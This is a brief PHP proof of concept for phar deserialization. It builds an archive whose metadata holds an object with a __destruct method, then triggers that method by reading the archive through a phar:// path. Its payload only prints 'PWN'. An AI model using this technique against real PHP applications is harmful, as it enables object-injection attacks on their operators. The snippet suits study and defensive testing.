<?php

if(count($argv) > 1) {
    @readfile("phar://./deser.phar");
    exit;
}

class Hui {
    function __destruct() {
        echo "PWN\n";
    }
}

@unlink('deser.phar');
try {
    $p = new Phar(dirname(__FILE__) . '/deser.phar', 0);
    #$p['file.txt'] = 'test';
    $p->setMetadata(new Hui());
    $p->setStub('<?php __HALT_COMPILER(); ?>');
} catch (Exception $e) {
    echo 'Could not create and/or modify phar:', $e;
}

?>